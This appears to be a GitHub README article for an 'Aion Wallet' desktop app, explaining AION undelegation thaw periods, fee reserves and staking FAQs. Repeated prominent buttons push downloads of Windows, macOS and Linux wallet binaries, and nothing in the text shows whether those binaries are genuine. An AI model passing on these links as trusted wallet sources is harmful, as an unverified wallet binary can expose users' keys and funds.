![Aion Wallet](assets/banner-article.png)

# Aion undelegating time: what the thaw actually waits for

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Undelegated AION becomes available again after 8,640 blocks, which is roughly one day, and that applies to pool delegation and solo staking alike.

The seven-day number that circulates online is real but belongs to something else: 60,480 blocks is the lockout on a pool changing its commission and the cooling period on a signing address. Reading it as the delegator's wait is the single most common mistake in Aion staking.

## You'll see this if

- You undelegated and the balance has not returned.
- A guide told you the wait is a week and a day has passed with nothing.
- You are choosing between pools and want to know how quickly you can leave.
- You undelegated and the transaction failed for a fee reason.

## The two numbers, side by side

| What changed | Blocks | Approximate time |
|---|---|---|
| Delegation or solo stake undelegated | 8,640 | about one day |
| Pool commission change | 60,480 | about seven days |
| Signing address cooling | 60,480 | about seven days |

Only the first row is the delegator's concern. The other two are operator rules, and they exist because a pool that could raise its commission and change its signing key instantly would be able to act against its delegators between blocks.

## Why the wait exists

A thaw protects the consensus from a delegator moving weight in and out around block production. Without it, stake could be pointed at whichever pool was about to produce and withdrawn immediately after, which would make the reward system meaningless.

The length is a balance: long enough to matter, short enough that leaving a pool you no longer trust is practical.

## What actually happens during the thaw

The transaction confirms, the stake stops counting toward the pool's weight, and the coins become movable when the thaw completes. The staking view usually shows the position as undelegating in the meantime.

The wallet may show the balance unchanged during this window. That is the stake still being held rather than a failed transaction.

## When undelegation fails

The common failure is the fee. Undelegating is a transaction, and it needs a small amount of AION available to pay for it; a delegation that consumed the entire balance leaves nothing to fund the exit.

The practical fix is to keep a reserve. A fraction of an AION is enough, and it is the difference between being able to leave a pool and being stuck until someone sends you a fee.

A failure for any other reason is worth reading from the error text rather than guessing. The [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) guide describes what a reportable fault looks like.

## What you can do while waiting

Nothing has to be done. The thaw completes on its own, and the address, the balance and the history are unaffected in the meantime.

You can delegate to a different pool after the thaw finishes, not before. Delegating again during the thaw adds a new position rather than cancelling the old one, which is rarely what a holder intends.

## Choosing with the thaw in mind

A pool that charges a low commission but changes it often is a different proposition from one that charges more and leaves it alone. The seven-day lockout limits how fast a commission can move, and it is worth knowing when you compare operators.

The [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) guide sets out what to compare, and the [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) article explains why a published rate is a snapshot rather than a promise.

## Prevention

Keep a fee reserve in the wallet before you delegate, not after you decide to leave.

Write down the delegation date and the pool. When the position changes, the record is what tells you whether the thaw is running or whether the transaction never happened.

Update the wallet before staking operations, so the staking view reflects the current contract behaviour rather than an older reading of it.

## Reading the staking screen during a thaw

A position that has been undelegated is usually still visible, marked as undelegating, until the thaw completes. That is the stake being held rather than a transaction that failed.

The balance in the wallet does not rise during the wait, which is the detail that generates most support questions. If you expected the coins back the next morning and they are not there, check the block height rather than the wallet, because one day is an approximation of 8,640 blocks.

Once the thaw completes, the amount is spendable and can be delegated again. The [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) article explains what the position was earning before it stopped.

## Frequently asked questions

### Is undelegating instant?

No. The stake stops counting immediately and becomes movable after 8,640 blocks, roughly a day.

### Where does the seven-day figure come from?

From the 60,480-block lockout on commission changes and on signing-address cooling. It is not the delegator's thaw.

### Can I cancel an undelegation?

No. The transaction is final; the only way back in is to delegate again once the thaw completes.

### Do I lose rewards during the thaw?

The stake is no longer counted for the pool, so it does not earn while it waits.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - delegating in the first place.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - what the position earns and why it varies.
- [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) - comparing operators before you commit.
- [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) - the bond that applies to operators, not delegators.
